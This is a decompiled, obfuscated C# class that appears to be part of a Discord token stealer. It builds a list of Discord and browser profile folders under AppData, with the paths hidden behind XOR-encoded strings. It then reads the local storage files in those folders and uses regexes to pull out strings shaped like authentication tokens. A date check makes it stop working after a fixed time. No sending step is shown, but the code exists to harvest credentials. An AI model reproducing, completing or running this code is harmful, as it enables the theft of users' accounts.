using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

internal class Class1
{
	private static List<string> list_0;

	private static void smethod_0()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		list_0.Add(folderPath + Class11.smethod_0("\uf26e\uf276\uf25b\uf241\uf251\uf25d\uf240\uf256", 62002));
		list_0.Add(folderPath + Class11.smethod_0("\uf867\uf85f\uf852\uf848\uf858\uf854\uf849\uf85f\uf858\uf85a\uf855\uf85a\uf849\uf842", 63539));
		list_0.Add(folderPath + Class11.smethod_0("\uedc3\uedfb\uedf6\uedec\uedfc\uedf0\ueded\uedfb\uedef\uedeb\uedfd", 60681));
		list_0.Add(folderPath + Class11.smethod_0("\ue8ea\ue8ea\ue8f9\ue8c6\ue8d3\ue8c4\ue8d7\ue896\ue8e5\ue8d9\ue8d0\ue8c2\ue8c1\ue8d7\ue8c4\ue8d3\ue8ea\ue8f9\ue8c6\ue8d3\ue8c4\ue8d7\ue896\ue8e5\ue8c2\ue8d7\ue8d4\ue8da\ue8d3", 59556));
		list_0.Add(folderPath2 + Class11.smethod_0("\uf36e\uf375\uf35d\uf35d\uf355\uf35e\uf357\uf36e\uf371\uf35a\uf340\uf35d\uf35f\uf357\uf36e\uf367\uf341\uf357\uf340\uf312\uf376\uf353\uf346\uf353\uf36e\uf376\uf357\uf354\uf353\uf347\uf35e\uf346", 62226));
		list_0.Add(folderPath2 + Class11.smethod_0("\uf6e2\uf6fc\uf6cc\uf6df\uf6c8\uf6db\uf6ed\uf6d1\uf6d8\uf6ca\uf6c9\uf6df\uf6cc\uf6db\uf6e2\uf6fc\uf6cc\uf6df\uf6c8\uf6db\uf693\uf6fc\uf6cc\uf6d1\uf6c9\uf6cd\uf6db\uf6cc\uf6e2\uf6eb\uf6cd\uf6db\uf6cc\uf69e\uf6fa\uf6df\uf6ca\uf6df\uf6e2\uf6fa\uf6db\uf6d8\uf6df\uf6cb\uf6d2\uf6ca", 63014));
		list_0.Add(folderPath2 + Class11.smethod_0("\ue082\ue087\ue0bf\ue0b0\ue0ba\ue0bb\ue0a6\ue082\ue087\ue0bf\ue0b0\ue0ba\ue0bb\ue0a6\ue09c\ue0ac\ue0b1\ue0a9\ue0ad\ue0bb\ue0ac\ue082\ue08b\ue0ad\ue0bb\ue0ac\ue0fe\ue09a\ue0bf\ue0aa\ue0bf\ue082\ue09a\ue0bb\ue0b8\ue0bf\ue0ab\ue0b2\ue0aa", 57558));
	}

	public static List<string> smethod_1()
	{
		smethod_0();
		List<string> list = new List<string>();
		foreach (string item in list_0)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			string path = item + Class11.smethod_0("\ued81\ued91\uedb2\uedbe\uedbc\uedb1\uedfd\ued8e\ueda9\uedb2\uedaf\uedbc\uedba\uedb8\ued81\uedb1\uedb8\uedab\uedb8\uedb1\uedb9\uedbf", 60700);
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles(Class11.smethod_0("\ue5b5\ue5b1\ue5f3\ue5fb\ue5fd", 58649));
			foreach (FileInfo fileInfo in files)
			{
				string input = fileInfo.OpenText().ReadToEnd();
				foreach (Match item2 in Regex.Matches(input, Class11.smethod_0("\ue90d\ue90a\ue921\ue97b\ue90b\ue92d\ue964\ue962\ue92b\ue90a\ue978\ue90d\ue90a\ue921\ue97b\ue90b\ue92d\ue960\ue92b\ue90a\ue978\ue90d\ue90a\ue921\ue97b\ue90b\ue92d\ue964\ue961\ue92b", 59732)))
				{
					list.Add(item2.Value);
				}
				foreach (Match item3 in Regex.Matches(input, Class11.smethod_0("\uf896\uf89d\uf89a\uf8a7\uf8d5\uf8a0\uf8a7\uf88c\uf8d6\uf8a6\uf880\uf8c3\uf8cf\uf886", 63691)))
				{
					list.Add(item3.Value);
				}
			}
		}
		return list;
	}

	static Class1()
	{
		if (DateTime.Now > new DateTime(637619016382624018L))
		{
			throw new Exception();
		}
		list_0 = new List<string>();
	}
}
